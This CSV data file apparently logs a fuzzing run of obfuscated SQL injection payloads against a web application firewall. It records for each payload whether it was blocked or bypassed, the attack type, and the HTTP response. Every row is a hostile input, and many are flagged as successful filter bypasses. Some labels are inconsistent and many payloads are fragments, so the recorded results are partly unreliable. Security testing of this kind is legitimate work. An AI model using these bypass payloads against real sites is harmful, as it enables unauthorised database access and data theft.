Payload,Status,Exploit Success,Exploit Types,Payload Type,Response Time (s),Memory Usage (MB),Semantic Preserved,Response Code
0%27<@!=.1+||%0bnot+{`if`+1}=1=+(not%0b{x%0b,Bypassed,Yes,unionAtk,Unknown,0.0281,73.56,No,200
0'<@=1.%0b||%0btrue+like%0b{x+(select+1)}=1%0b||%27,Bypassed,No,None,Unknown,0.0221,73.56,No,500
0%27<@!=1.%0b||%0b!+true=%0b(not+{x+(select+1)}=1,Bypassed,Yes,unionAtk,Unknown,0.0168,73.56,No,200
0%27<@!=1.+or+not+{x+(select+1)}=1=%0b(!+{x,Blocked,No,None,Unknown,0.0086,73.56,No,403
0'<@=1.+or%0b{x%0b(select%0b1)}=1+like%0b{`if`+1}=1%0bor',Bypassed,No,None,Unknown,0.0355,73.56,No,500
0%27<@=1.%0b||%0bnot+{a+1}=1=+(!+{x+(select,Bypassed,Yes,unionAtk,Unknown,0.0224,73.56,No,200
0%27<@!=1+or+!%0b{a+1}=1=+(!+true),Bypassed,Yes,unionAtk,booleanAtk,0.0353,73.56,No,200
0%27<@!=1%0bor+!%0b{x%0b(select+1)}=1=%0b(!+{`if`,Bypassed,Yes,unionAtk,Unknown,0.0317,73.56,No,200
0%27<@=.1+||%0b!+{x+(select+1)}=1=+(not%0b{`if`,Blocked,No,None,Unknown,0.0078,73.56,No,403
0'<@!=1.+||+{a+1}=1%0blike+true+||%27,Bypassed,No,None,Unknown,0.0235,73.56,No,500
0'<@!=1%0bor+true+like+true%0bor%27,Bypassed,No,None,booleanAtk,0.0185,73.56,No,500
0'<@=1.+or+not%0b{x+(select+1)}=1=+(not+{x,Bypassed,No,None,Unknown,0.0127,73.56,No,500
0'<@=1.%0b||+not+1=%0b(not+{x%0b(select+1)}=1,Bypassed,No,None,Unknown,0.0132,73.56,No,500
0%27<@!=1+or%0bnot%0b1=+(not%0btrue)+||,Bypassed,Yes,unionAtk,booleanAtk,0.0349,73.56,No,200
0'<@!=1.+or%0bnot+{`if`%0b1}=1=+(not+true),Bypassed,No,None,booleanAtk,0.015,73.56,No,500
0%27<@=1+or+{x+(select%0b1)}=1+like+{x+(select+1)}=1+,Blocked,No,None,Unknown,0.0097,73.56,No,403
0'<@=1.+or+!%0btrue=%0b(!+{x+(select%0b1)}=1,Bypassed,No,None,booleanAtk,0.0067,73.56,No,500
0%27<@=1+or%0b!+{x%0b(select+1)}=1=%0b(not%0b{x,Bypassed,Yes,unionAtk,Unknown,0.0205,73.56,No,200
0'<@!=1+||%0bnot+{a%0b1}=1=+(not+{x%0b(select,Bypassed,No,None,Unknown,0.0196,73.56,No,500
0%27<@!=1+||+!+1=+(not~false)+or,Bypassed,Yes,unionAtk,booleanAtk,0.019,73.56,No,200
0%27<@!=1.%0b||+!+{x+(select+1)}=1=%0b(!+{`if`,Bypassed,Yes,unionAtk,Unknown,0.023,73.56,No,200
0'<@=1%0bor%0b!~false=+(!%0b{`if`%0b1}=1),Bypassed,No,None,booleanAtk,0.0162,73.56,No,500
0%27<@=1.+||%0bnot%0b{x%0b(select%0b1)}=1=%0b(!+,Bypassed,Yes,unionAtk,Unknown,0.0135,73.56,No,200
0'<@!=.1+||%0b!+{x+(select%0b1)}=1=+(not%0b{`if`,Blocked,No,None,Unknown,0.0122,73.47,No,403
0%27<@!=.1%0bor%0bnot%0b{x%0b(select+1)}=1=%0b(!+{x,Bypassed,Yes,unionAtk,Unknown,0.0137,73.47,No,200
0'<@!=1.+||+!~0=+(!%0btrue)%0bor,Bypassed,No,None,booleanAtk,0.0097,73.47,No,500
0'<@!=1%0bor%0b!%0btrue=+(not%0b1)%0bor,Bypassed,No,None,booleanAtk,0.016,73.47,No,500
0%27<@!=1.+or%0bnot%0b{`if`%0b1}=1=+(!+{a+1}=1,Bypassed,Yes,unionAtk,Unknown,0.0095,73.47,No,200
0%27or%0b!@<@.%0bor%0bnot%0btrue=+(not%0b{`if`+,Bypassed,Yes,unionAtk,booleanAtk,0.0143,73.47,No,200
0'<@!=.1+||+not%0btrue=+(!%0b{x+(select%0b1)}=1,Bypassed,No,None,Unknown,0.0197,73.47,No,500
0'<@=1+or+!%0b{a%0b1}=1=%0b(not%0b{x+(select,Bypassed,No,None,Unknown,0.0237,73.47,No,500
0%27<@=1.%0b||+not~false=+(not%0b{x%0b(select%0b1)}=1,Bypassed,Yes,unionAtk,Unknown,0.028,73.47,No,200
0%27<@=1.+or+!%0b{`if`+1}=1=%0b(0)+or,Bypassed,Yes,unionAtk,Unknown,0.0223,73.47,No,200
0%27||%0b@<@.+||%0b{x+(select+1)}=1%0blike+{x+(select,Bypassed,Yes,unionAtk,Unknown,0.0145,73.47,No,200
0'<@!=1.+||+not%0btrue=%0b(!+{x%0b(select+1)}=1,Bypassed,No,None,Unknown,0.0135,73.47,No,500
0%27<@=.1%0b||+!+{a%0b1}=1=+(not%0b{x%0b(select,Bypassed,Yes,unionAtk,Unknown,0.0206,73.47,No,200
0'<@=1.+or%0bnot%0b{a+1}=1=%0b(!+{x%0b(select,Bypassed,No,None,Unknown,0.033,73.47,No,500
0'<@=1%0b||+!%0b{x+(select+1)}=1=%0b(false),Bypassed,No,None,Unknown,0.0205,73.47,No,500
0%27or+@<@.%0bor+{x+(select+1)}=1%0blike%0b{`if`+1}=1,Blocked,No,None,Unknown,0.0073,73.47,No,403
0%27<@=.1%0bor+!%0b{x+(select%0b1)}=1=%0b(!+{`if`,Bypassed,Yes,unionAtk,Unknown,0.0156,73.47,No,200
0%27<@=1%0b||%0bnot+{x+(select+1)}=1=%0b(not+,Bypassed,Yes,unionAtk,Unknown,0.02,73.47,No,200
0'<@!=.1%0bor+!%0b1=+(!+{a%0b1}=1),Bypassed,No,None,Unknown,0.0129,73.47,No,500
0%27<@=1+or%0b!+{x%0b(select+1)}=1=+(not%0b{a,Bypassed,Yes,unionAtk,Unknown,0.0159,73.47,No,200
0%27<@=1+||+{a%0b1}=1+like+{x+(select+1)}=1+||%27,Blocked,No,None,Unknown,0.0169,73.49,No,403
0%27<@=1%0bor%0bnot+true%0bis%0bfalse--%0b,Bypassed,Yes,unionAtk,piggyAtk,0.0105,73.55,No,200
0%27<@=1+or+!~false=+(!%0b{x+(select%0b1)}=1,Bypassed,Yes,unionAtk,booleanAtk,0.0158,73.56,No,200
0%27<@!=1.%0b||+not+{x%0b(select%0b1)}=1=+(!%0b{x,Bypassed,Yes,unionAtk,Unknown,0.0125,73.56,No,200
0'<@!=1+or%0bnot+{x%0b(select+1)}=1=%0b(!+{x,Bypassed,No,None,Unknown,0.0263,73.56,No,500
0'<@=.1+or%0b!%0b{a+1}=1=+(not%0b{x+(select,Bypassed,No,None,Unknown,0.0133,73.56,No,500
0'<@!=1%0bor+not~false=+(not+{x+(select+1)}=1,Bypassed,No,None,booleanAtk,0.0261,73.56,No,500
0'<@=.1%0bor+not+{x%0b(select+1)}=1=%0b(!%0btrue,Bypassed,No,None,booleanAtk,0.0191,73.56,No,500
0%27<@!=1.+||%0b!%7efalse=%0b(not~false)+or,Bypassed,Yes,unionAtk,booleanAtk,0.015,73.56,No,200
0'<@!=.1+||%0bnot%0b{x%0b(select+1)}=1=+(!+,Blocked,No,None,Unknown,0.0137,73.56,No,403
0%27<@=1+or%0b{a+1}=1+like+{x%0b(select+1)}=1%0bor',Bypassed,No,None,Unknown,0.0251,73.56,No,500
0%27<@=1.+or+not+{a+1}=1=+(not%0b{x+(select,Bypassed,Yes,unionAtk,Unknown,0.0158,73.56,No,200
0'<@=1.+or%0bnot%0b{`if`+1}=1=%0b(!+{x+(select,Bypassed,No,None,Unknown,0.0119,73.56,No,500
0'<@!=.1+or+!%0b{x%0b(select%0b1)}=1=%0b(!%0b{`if`,Bypassed,No,None,Unknown,0.0099,73.56,No,500
0%27<@!=1%0bor%0bnot%0b{x+(select+1)}=1=+(not%0b,Bypassed,Yes,unionAtk,Unknown,0.0131,73.56,No,200
0%27<@!=1.+or+not+{`if`%0b1}=1=%0b(!%0b{a+1}=1,Bypassed,Yes,unionAtk,Unknown,0.0139,73.56,No,200
0'<@=.1%0b||+not+{x+(select+1)}=1=+(false),Bypassed,No,None,Unknown,0.0207,73.56,No,500
0%27<@=.1%0bor+not%0b{`if`%0b1}=1=%0b(!%0b{a+,Bypassed,Yes,unionAtk,Unknown,0.0239,73.56,No,200
0'<@=1%0bor+not+true=+(!%0b{x%0b(select+1)}=1,Bypassed,No,None,booleanAtk,0.0104,73.56,No,500
0%27<@!=.1+||+not+{x+(select+1)}=1=%0b(!+{`if`,Blocked,No,None,Unknown,0.0145,73.56,No,403
0%27<@!=.1%0b||%0bnot+{x%0b(select%0b1)}=1=+(not+{x,Bypassed,Yes,unionAtk,Unknown,0.0208,73.56,No,200
0%27<@=1.+or+!+{a+1}=1=+(not%0b{x+(select,Bypassed,Yes,unionAtk,Unknown,0.0139,73.56,No,200
0'<@=.1%0b||%0b!+{x%0b(select+1)}=1=+(not+{x,Bypassed,No,None,Unknown,0.0136,73.56,No,500
0%27<@=1%0b||+{a%0b1}=1%0blike%0btrue+||',Bypassed,No,None,Unknown,0.0141,73.56,No,500
0'<@!=1%0bor%0b!+{a%0b1}=1=+(not+{x%0b,Bypassed,No,None,Unknown,0.0111,73.56,No,500
0'||+@<@.+||%0bnot%0b{x+(select+1)}=1=+(not,Bypassed,No,None,Unknown,0.0173,73.56,No,500
0'<@!=1.%0b||+!+{a%0b1}=1=+(not+{x%0b(select,Bypassed,No,None,Unknown,0.0187,73.56,No,500
0%27<@=.1+or%0b!+true=%0b(!%0b{x%0b(select+1)}=1,Bypassed,Yes,unionAtk,booleanAtk,0.0114,73.56,No,200
0'or+1<@.+or+not%7e0=%0b(!+{x%0b,Bypassed,No,None,Unknown,0.014,73.56,No,500
0%27<@!=.1+or+not%0b{a%0b1}=1=%0b(!+true),Bypassed,Yes,unionAtk,booleanAtk,0.0202,73.56,No,200
0'||+@<@.%0bor+not%0b{`if`+1}=1=%0b(not%0b,Bypassed,No,None,Unknown,0.0163,73.47,No,500
0'<@!=.1+or%0b!+{a%0b1}=1=+(not%0b{x%0b(select,Bypassed,No,None,Unknown,0.0225,73.47,No,500
0%27<@=1.%0bor+!%7e0=+(!+{a%0b1}=1),Bypassed,Yes,unionAtk,Unknown,0.0173,73.47,No,200
0'||%0b1<@.+||+0=+(!%0b{x%0b(select+,Blocked,No,None,Unknown,0.0226,73.47,No,403
0'<@=1+||+not+{x+(select+1)}=1=%0b(not+{x,Blocked,No,None,Unknown,0.0169,73.47,No,403
0'<@!=.1+||%0b!+{x%0b(select+1)}=1=%0b(!+{x,Bypassed,No,None,Unknown,0.0168,73.47,No,500
0'<@!=1%0bor+!+1=+(!%0b{x+(select+1)}=1,Bypassed,No,None,Unknown,0.0266,73.47,No,500
0%27<@=1.%0bor+not+{x+(select+1)}=1=+(!%0b1,Bypassed,Yes,unionAtk,Unknown,0.0184,73.47,No,200
0'<@=1%0bor+!%0b{`if`%0b1}=1=+(not%0b{a%0b1}=1,Bypassed,No,None,Unknown,0.0161,73.47,No,500
0%27<@!=1%0b||+not%0b{x%0b(select+1)}=1=+(!+{x,Bypassed,Yes,unionAtk,Unknown,0.0202,73.47,No,200
0%27<@!=1.%0b||%0bnot%0b{x%0b(select+1)}=1=%0b(!%7e0,Bypassed,Yes,unionAtk,Unknown,0.015,73.47,No,200
0'<@!=1.%0b||+{a+1}=1+like%0b{a%0b1}=1%0b||',Bypassed,No,None,Unknown,0.0163,73.47,No,500
0'<@=1%0b||%0b!+{x+(select%0b1)}=1=%0b(!%0b{x,Bypassed,No,None,Unknown,0.0135,73.47,No,500
0%27||%0b@<@.+||%0b!+{a+1}=1=+(not%0b,Bypassed,Yes,unionAtk,Unknown,0.0212,73.47,No,200
0'<@!=1+||+not+{x%0b(select+1)}=1=%0b(!+{x,Bypassed,No,None,Unknown,0.0108,73.47,No,500
0'<@!=1.+or+!%0btrue=+(not%0b{x%0b(select+1)}=1,Bypassed,No,None,booleanAtk,0.02,73.47,No,500
0'<@!=1+||+!+{x%0b(select+1)}=1=+(!%0b{x,Bypassed,No,None,Unknown,0.0193,73.47,No,500
0%27<@!=1.+||+!+{a+1}=1=%0b(!+{a%0b1}=1,Bypassed,Yes,unionAtk,Unknown,0.0147,73.47,No,200
0%27<@=1%0bor+not%7efalse=+(!+{x+(select+1)}=1,Bypassed,Yes,unionAtk,booleanAtk,0.0237,73.47,No,200
0%27<@=1+||%0b!+1=%0b(not+true)%0bor,Bypassed,Yes,unionAtk,booleanAtk,0.0187,73.54,No,200
0%27<@!=1+or+not+{`if`%0b1}=1=%0b(not+{`if`%0b,Bypassed,Yes,unionAtk,Unknown,0.018,73.56,No,200
0%27<@=1.%0b||%0bnot+{x+(select%0b1)}=1=+(!%7efalse,Bypassed,Yes,unionAtk,Unknown,0.022,73.56,No,200
0%27<@=.1%0b||+not+{`if`+1}=1=+(!+1),Bypassed,Yes,unionAtk,Unknown,0.016,73.56,No,200
0'<@!=.1%0b||%0bnot%0b{x%0b(select%0b1)}=1=%0b(!+{x,Bypassed,No,None,Unknown,0.0189,73.56,No,500
0'<@!=1.%0b||+not+{a%0b1}=1=+(not%0btrue),Bypassed,No,None,Unknown,0.0157,73.56,No,500
0%27<@!=1.+||+{a+1}=1+like+{x%0b(select%0b1)}=1%0b||',Bypassed,No,None,Unknown,0.0268,73.56,No,500
0'<@!=1+or+!%0b{a%0b1}=1=+(not%0b{x%0b(select,Bypassed,No,None,Unknown,0.0195,73.56,No,500
0'<@=1.%0bor%0b!+{a+1}=1=+(not%0b{x+(select,Bypassed,No,None,Unknown,0.0208,73.56,No,500
0%27<@!=.1+or%0b!%0b{x%0b(select+1)}=1=%0b(not+1,Bypassed,Yes,unionAtk,Unknown,0.0161,73.56,No,200
0%27<@=1%0bor+!%0b{x%0b(select+1)}=1=%0b(!+{`if`,Bypassed,Yes,unionAtk,Unknown,0.0164,73.56,No,200
0'<@!=1+or+{`if`+1}=1+like%0b{x+(select%0b1)}=1%0b||',Bypassed,No,None,Unknown,0.023,73.56,No,500
0'<@!=1+||%0bnot%0b{x+(select%0b1)}=1=%0b(not~false,Blocked,No,None,Unknown,0.0184,73.56,No,403
0%27<@!=1.+or+not%7efalse=+(!+{a+1}=1),Bypassed,Yes,unionAtk,booleanAtk,0.02,73.56,No,200
0%27<@=.1+||+not+{`if`+1}=1=+(not+{x%0b(select,Bypassed,Yes,unionAtk,Unknown,0.0197,73.56,No,200
0'<@!=1%0bor+!+{x+(select+1)}=1=%0b(!%0b,Bypassed,No,None,Unknown,0.0225,73.56,No,500
0%27<@=1%0b||+!+{x%0b(select%0b1)}=1=+(not%0b{x,Bypassed,Yes,unionAtk,Unknown,0.0266,73.56,No,200
0'<@=1+||+not%0b{x+(select+1)}=1=+(not+{x,Bypassed,No,None,Unknown,0.0099,73.56,No,500
0%27<@!=1.+or+false=+(not%0b{`if`+1}=1)+or,Bypassed,Yes,unionAtk,booleanAtk,0.0081,73.56,No,200
0%27<@=1.%0bor%0bnot+true=%0b(not%0b{`if`%0b1}=1),Bypassed,Yes,unionAtk,booleanAtk,0.0135,73.56,No,200
0'<@=.1+or%0b1%0blike%0b{a%0b1}=1%0b||',Blocked,No,None,Unknown,0.0181,73.56,No,403
0%27<@!=.1+||+!+{x%0b(select+1)}=1=%0b(!+{`if`,Bypassed,Yes,unionAtk,Unknown,0.0162,73.56,No,200
0'<@!=1.+or+!+{`if`%0b1}=1=+(!%0b{x+(select,Bypassed,No,None,Unknown,0.0072,73.56,No,500
0'<@!=.1+||+!%0b{`if`%0b1}=1=%0b(!%0b{a%0b,Bypassed,No,None,Unknown,0.0136,73.56,No,500
0%27<@!=1.+or+not%0b{x+(select%0b1)}=1=+(not%0b{`if`,Bypassed,Yes,unionAtk,Unknown,0.0128,73.56,No,200
0%27<@!=.1+or%0b!%7efalse=%0b(!%0b{a%0b1}=1),Bypassed,Yes,unionAtk,booleanAtk,0.0259,73.56,No,200
0'<@=1.%0b||+not+{a+1}=1=%0b(!%0b{x+(select,Bypassed,No,None,Unknown,0.0169,73.56,No,500
0%27<@!=.1+||%0b!%0b{a%0b1}=1=+(not+{x+,Bypassed,Yes,unionAtk,Unknown,0.016,73.56,No,200
0'<@=.1+or%0bnot~0=+(not%0b{x%0b(select+,Bypassed,No,None,Unknown,0.0133,73.56,No,500
0'<@!=1+||%0b!%7e0=%0b(!~false)--%0b,Bypassed,No,None,piggyAtk,0.0207,73.56,No,500
0'<@=1.%0b||%0bnot+{`if`%0b1}=1=+(not+{x%0b(select,Bypassed,No,None,Unknown,0.026,73.56,No,500
0'<@=.1+or%0b!+true=%0b(!+{x+(select%0b1)}=1,Bypassed,No,None,booleanAtk,0.0162,73.47,No,500
0%27<@!=1.+||%0b!%0b{x%0b(select+1)}=1=+(not+true,Bypassed,Yes,unionAtk,Unknown,0.0162,73.47,No,200
0%27<@=.1+or%0b!%0b{x%0b(select+1)}=1=+(not%0b{a,Bypassed,Yes,unionAtk,Unknown,0.0199,73.47,No,200
0'<@!=1+||+!%0btrue=%0b(not+{`if`%0b1}=1),Bypassed,No,None,Unknown,0.0147,73.47,No,500
0%27<@!=.1+||%0b!%0b{x+(select+1)}=1=%0b(not%0b{x,Blocked,No,None,Unknown,0.014,73.47,No,403
0'<@=.1%0bor+!+{a+1}=1=%0b(not%7efalse),Bypassed,No,None,booleanAtk,0.018,73.47,No,500
0%27<@=.1+or+!%0b{a+1}=1=+(not%7efalse),Bypassed,Yes,unionAtk,booleanAtk,0.0103,73.47,No,200
0'<@!=1.+or+!+{x%0b(select+1)}=1=+(not+,Bypassed,No,None,Unknown,0.025,73.47,No,500
0'<@!=1+||%0bnot%0b1=%0b(not+{x+(select%0b1)}=1,Bypassed,No,None,Unknown,0.0174,73.47,No,500
0%27<@!=1%0bor%0b!+{x+(select%0b1)}=1=%0b(!+{x,Bypassed,Yes,unionAtk,Unknown,0.0162,73.47,No,200
0'<@=.1%0b||%0bnot+1=+(not+1)%0bor,Bypassed,No,None,Unknown,0.0319,73.47,No,500
0'<@=.1+||%0bnot%0b{x%0b(select+1)}=1=+(not%0b{x,Blocked,No,None,Unknown,0.0141,73.47,No,403
0%27<@=1+or+not~0=%0b(not~0)+||,Bypassed,Yes,unionAtk,Unknown,0.0153,73.47,No,200
0'<@!=1+or%0b!+true=+(!+{x+(select+1)}=1,Blocked,No,None,booleanAtk,0.0185,73.47,No,403
0%27<@!=1%0bor+not+{x+(select%0b1)}=1=%0b(not%0b,Bypassed,Yes,unionAtk,Unknown,0.0296,73.47,No,200
0'<@!=1+||%0bnot+{a%0b1}=1=+(not%7efalse),Bypassed,No,None,Unknown,0.0174,73.47,No,500
0'<@=.1%0bor%0bnot~0=+(!+{x%0b(select+1)}=1,Bypassed,No,None,Unknown,0.0266,73.47,No,500
0'<@=.1+or+{`if`+1}=1%0blike+true+||%27,Bypassed,No,None,booleanAtk,0.0242,73.47,No,500
0%27<@!=1%0bor+!%0b{`if`+1}=1=+(not+{x%0b(select,Bypassed,Yes,unionAtk,Unknown,0.0177,73.51,No,200
0%27<@!=1+||+!%0b{x%0b(select+1)}=1=%0b(not%0b{x,Bypassed,Yes,unionAtk,Unknown,0.0171,73.55,No,200
0%27<@=1+||%0b!+{`if`%0b1}=1=%0b(!+{a+1}=1,Bypassed,Yes,unionAtk,Unknown,0.0168,73.56,No,200
0%27<@=1%0b||%0bnot+{x%0b(select%0b1)}=1=+(!+,Bypassed,Yes,unionAtk,Unknown,0.0174,73.56,No,200
0%27||+!@<@.%0bor+not~0=%0b(!+{x+,Bypassed,Yes,unionAtk,Unknown,0.022,73.56,No,200
0'<@!=.1%0bor+!+{`if`%0b1}=1=%0b(!+{a%0b1}=1,Bypassed,No,None,Unknown,0.0216,73.56,No,500
0'<@!=1+or+!+{x%0b(select+1)}=1=+(!%0btrue,Bypassed,No,None,booleanAtk,0.0127,73.56,No,500
0%27<@=.1%0bor+not+{x%0b(select%0b1)}=1=%0b(!%0b,Bypassed,Yes,unionAtk,Unknown,0.0094,73.56,No,200
0'<@!=.1+or%0b!+{x+(select%0b1)}=1=+(!%0b{x,Blocked,No,None,Unknown,0.0115,73.56,No,403
0'<@=1.+or+!+{a+1}=1=+(!%0b{x+(select,Bypassed,No,None,Unknown,0.0371,73.56,No,500
0'<@=1%0bor%0b{`if`%0b1}=1%0blike+{x%0b(select+1)}=1%0bor',Bypassed,No,None,Unknown,0.025,73.56,No,500
0'<@=1+or%0bnot+{x+(select+1)}=1=+(not+true,Blocked,No,None,booleanAtk,0.0264,73.56,No,403
0'<@!=1%0bor%0b!%0b{x%0b(select+1)}=1=+(not+{a,Bypassed,No,None,Unknown,0.0167,73.56,No,500
0%27<@!=1.%0bor%0bnot%0b1=+(!+{a+1}=1),Bypassed,Yes,unionAtk,Unknown,0.0182,73.56,No,200
0%27<@=.1+||%0b!+{`if`%0b1}=1=%0b(not+1),Bypassed,Yes,unionAtk,Unknown,0.016,73.56,No,200
0%27<@!=1+or%0bnot+{x+(select+1)}=1=+(not+{x,Blocked,No,None,Unknown,0.016,73.56,No,403
0'<@=.1+||%0bnot%0b{`if`+1}=1=+(not+{a%0b1}=1,Bypassed,No,None,Unknown,0.016,73.56,No,500
0'<@=1.%0b||+!+{x+(select+1)}=1=+(0),Bypassed,No,None,Unknown,0.0226,73.56,No,500
0%27<@!=1%0bor%0bnot+{`if`+1}=1=%0b(!%0b{x+(select,Bypassed,Yes,unionAtk,Unknown,0.0117,73.56,No,200
0'<@=1+or+not+{a+1}=1=+(!+{x%0b(select,Bypassed,No,None,Unknown,0.0168,73.56,No,500
0%27<@=.1%0bor+not%0b{x%0b(select%0b1)}=1=+(not%0b,Bypassed,Yes,unionAtk,Unknown,0.0117,73.56,No,200
0%27<@!=1%0b||%0bnot+{a%0b1}=1=+(not+{x%0b(select,Bypassed,Yes,unionAtk,Unknown,0.012,73.56,No,200
0%27<@!=1.%0b||%0b!+{a%0b1}=1=+(false)+or,Bypassed,Yes,unionAtk,booleanAtk,0.0153,73.56,No,200
0'<@=1+or+!%0b{x%0b(select+1)}=1=%0b(!%0b{x,Bypassed,No,None,Unknown,0.012,73.56,No,500
0%27<@=.1%0b||%0bnot+{x%0b(select+1)}=1=+(!+{`if`,Bypassed,Yes,unionAtk,Unknown,0.0252,73.56,No,200
0%27<@=1%0bor+not+{x+(select+1)}=1=%0b(not+{a,Bypassed,Yes,unionAtk,Unknown,0.0175,73.56,No,200
0%27<@=.1+or%0bnot%0b1=+(false)+or%27,Bypassed,Yes,unionAtk,booleanAtk,0.0093,73.56,No,200
0'<@!=.1+||%0b{a+1}=1%0blike%0b{`if`+1}=1%23,Bypassed,No,None,piggyAtk,0.0111,73.56,No,500
0%27or+@<@.%0b||+!%0b{x%0b(select+1)}=1=+(not,Bypassed,Yes,unionAtk,Unknown,0.0307,73.56,No,200
0%27<@!=.1+||%0b!+{`if`+1}=1=+(not~false),Bypassed,Yes,unionAtk,Unknown,0.0223,73.56,No,200
0'<@=.1+or+!~false=+(not%0b{a%0b1}=1),Bypassed,No,None,booleanAtk,0.0169,73.56,No,500
0%27<@!=.1+||+not~0=+(not%7efalse)%0bor,Bypassed,Yes,unionAtk,booleanAtk,0.014,73.56,No,200
0'<@=.1%0bor+not+{`if`+1}=1=%0b(!+true),Bypassed,No,None,booleanAtk,0.0167,73.47,No,500
0%27<@!=1.%0bor%0b!%0b1=+(not%0b{x+(select+,Bypassed,Yes,unionAtk,Unknown,0.0177,73.47,No,200
0'<@=.1+or%0b!%0b{x%0b(select%0b1)}=1+is%0bfalse%0b||,Blocked,No,None,booleanAtk,0.0131,73.47,No,403
0%27<@=1%0b||+!%0b{x+(select+1)}=1=+(not+,Bypassed,Yes,unionAtk,Unknown,0.0229,73.47,No,200
0%27<@!=.1+or%0b!%7e0=+(not+true)+or,Bypassed,Yes,unionAtk,booleanAtk,0.0325,73.47,No,200
0'<@!=1.+or+{x%0b(select+1)}=1+like%0b{x%0b(select+1)}=1+,Blocked,No,None,Unknown,0.0156,73.47,No,403
0%27<@=1+or+!+{x%0b(select+1)}=1=+(not+{x,Bypassed,Yes,unionAtk,Unknown,0.03,73.47,No,200
0'||%0b1<@+or%0b{x+(select%0b1)}=1+like+{x+(select,Bypassed,No,None,Unknown,0.0256,73.47,No,500
0'<@!=.1+||%0bnot%0b{x+(select+1)}=1=%0b(!+,Blocked,No,None,Unknown,0.0071,73.47,No,403
0%27<@!=1+||+!%0b{x%0b(select+1)}=1=%0b(not%7efalse,Bypassed,Yes,unionAtk,Unknown,0.0181,73.47,No,200
0'<@!=1.%0bor%0bnot+{`if`+1}=1=+(!+{x+(select,Bypassed,No,None,Unknown,0.0186,73.47,No,500
0'<@!=1.%0b||+!%0b{`if`%0b1}=1=+(not%0b{x+(select,Bypassed,No,None,Unknown,0.0179,73.47,No,500
0%27<@=.1%0bor%0bnot+true=+(!+{x+(select+1)}=1,Bypassed,Yes,unionAtk,booleanAtk,0.0208,73.47,No,200
0'<@!=1+||+!+{x+(select+1)}=1=%0b(!+{x,Blocked,No,None,Unknown,0.0181,73.49,No,403
0%27<@!=.1%0b||%0b!%0b{`if`%0b1}=1=+(!%0b1),Bypassed,Yes,unionAtk,Unknown,0.0236,73.54,No,200
0%27<@!=1+or+!%0b{a+1}=1=+(not+{x%0b(select,Bypassed,Yes,unionAtk,Unknown,0.0225,73.56,No,200
0'<@=.1%0bor%0b!%7efalse=+(!~false)+||,Bypassed,No,None,booleanAtk,0.0156,73.56,No,500
0'<@!=1%0bor+not%0b{x+(select%0b1)}=1=+(!+1,Bypassed,No,None,Unknown,0.0187,73.56,No,500
0%27<@!=1.%0bor+not+{x+(select%0b1)}=1=+(not+{x,Bypassed,Yes,unionAtk,Unknown,0.0164,73.56,No,200
0%27<@=.1+||+!%0b{a+1}=1=%0b(not%0b{x+,Bypassed,Yes,unionAtk,Unknown,0.0336,73.56,No,200
0'<@!=.1+or+not~false=+(not%0b{x+(select%0b1)}=1,Bypassed,No,None,booleanAtk,0.0202,73.56,No,500
0'<@=.1%0b||%0bnot+true=+(!+{`if`+1}=1),Bypassed,No,None,Unknown,0.0241,73.56,No,500
0%27<@!=1+or%0bnot%0b{x+(select+1)}=1=%0b(not~false,Blocked,No,None,booleanAtk,0.0188,73.56,No,403
0%27<@!=.1%0b||%0bnot+{x%0b(select%0b1)}=1=%0b(not%0b{x,Bypassed,Yes,unionAtk,Unknown,0.0127,73.56,No,200
0%27<@=1.+or%0b{`if`%0b1}=1+like+1+or',Bypassed,No,None,Unknown,0.0276,73.56,No,500
0'<@!=1%0bor+!%0b{x+(select%0b1)}=1=+(!+,Bypassed,No,None,Unknown,0.0089,73.56,No,500
0'<@!=.1%0b||+!+{x+(select%0b1)}=1=%0b(not+{a,Bypassed,No,None,Unknown,0.0187,73.56,No,500
0%27<@=1+or+!+{x%0b(select+1)}=1=+(not%0b,Bypassed,Yes,unionAtk,Unknown,0.0191,73.56,No,200
0'<@=1.+or%0bnot%0b{x+(select%0b1)}=1=%0b(not%0b,Blocked,No,None,Unknown,0.0253,73.56,No,403
0'<@!=1.%0b||+!%7efalse=+(!%0b{`if`+1}=1),Bypassed,No,None,Unknown,0.0218,73.56,No,500
0%27<@=1+or+!+{`if`%0b1}=1+is+false+or',Bypassed,No,None,booleanAtk,0.0162,73.56,No,500
0%27<@=.1+||+not+{x%0b(select+1)}=1=+(not+{`if`,Bypassed,Yes,unionAtk,Unknown,0.0235,73.56,No,200
0%27<@!=1+or+not%0b{a%0b1}=1=%0b(not+{`if`%0b1}=1,Bypassed,Yes,unionAtk,Unknown,0.0333,73.56,No,200
